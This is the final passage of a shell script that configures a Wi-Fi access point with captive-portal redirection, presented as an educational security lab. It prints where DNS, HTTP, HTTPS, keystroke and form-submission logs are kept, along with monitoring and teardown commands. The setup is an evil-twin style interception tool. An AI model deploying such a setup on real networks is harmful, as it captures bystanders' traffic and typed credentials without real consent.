ln -sf index.html "$PORTAL_DIR/hotspot-detect.html"
ln -sf index.html "$PORTAL_DIR/ncsi.txt"
ln -sf index.html "$PORTAL_DIR/connecttest.txt"

echo "✅ Captive portal detection configured"

echo ""
echo "🎓 EDUCATIONAL CYBERSECURITY LAB READY!"
echo "======================================"
echo ""
echo "📊 Lab Configuration:"
echo "- Network Name: $LAB_SSID"
echo "- Lab IP Address: $LAB_IP"
echo "- Interface: $WIFI_INTERFACE"
echo "- Portal URL: http://$LAB_IP"
echo ""
echo "📁 Educational Log Files:"
echo "- Student Registrations: $LOG_DIR/student_registrations.log"
echo "- DNS Queries: $LOG_DIR/educational_dns.log"
echo "- HTTP Traffic: $LOG_DIR/educational_http.log"
echo "- HTTPS Connections: $LOG_DIR/educational_https.log"
echo "- Keystroke Analysis: $LOG_DIR/educational_keystrokes.log"
echo "- Form Submissions: $LOG_DIR/educational_forms.log"
echo "- Network Activity: $LOG_DIR/educational_activity.log"
echo ""
echo "🎯 Educational Features:"
echo "- ✅ Transparent lab identification"
echo "- ✅ Full disclosure of monitoring capabilities"
echo "- ✅ Informed consent required"
echo "- ✅ Educational context provided"
echo "- ✅ Security lessons integrated"
echo "- ✅ Safe test environment"
echo ""
echo "👥 Student Instructions:"
echo "1. Connect to WiFi network: '$LAB_SSID'"
echo "2. Browser will automatically open lab portal"
echo "3. Read educational information carefully"
echo "4. Complete student registration"
echo "5. Agree to educational monitoring terms"
echo "6. Begin lab activities and testing"
echo ""
echo "🔍 Monitor Lab Activity:"
echo "- View real-time logs: sudo tail -f $LOG_DIR/*.log"
echo "- Check student registrations: cat $LOG_DIR/student_registrations.log"
echo "- Monitor network activity: cat $LOG_DIR/educational_activity.log"
echo ""
echo "🛑 Stop Lab Session:"
echo "- sudo pkill hostapd dnsmasq python3"
echo "- sudo iptables -F && sudo iptables -t nat -F"
echo "- sudo systemctl start NetworkManager"
echo ""
echo "🎓 Educational Objectives Achieved:"
echo "- Students learn about WiFi security risks"
echo "- Demonstrate network monitoring capabilities"
echo "- Show importance of HTTPS and VPNs"
echo "- Practice identifying security threats"
echo "- Build cybersecurity awareness"
echo ""
echo "The lab is now active and ready for educational use!"
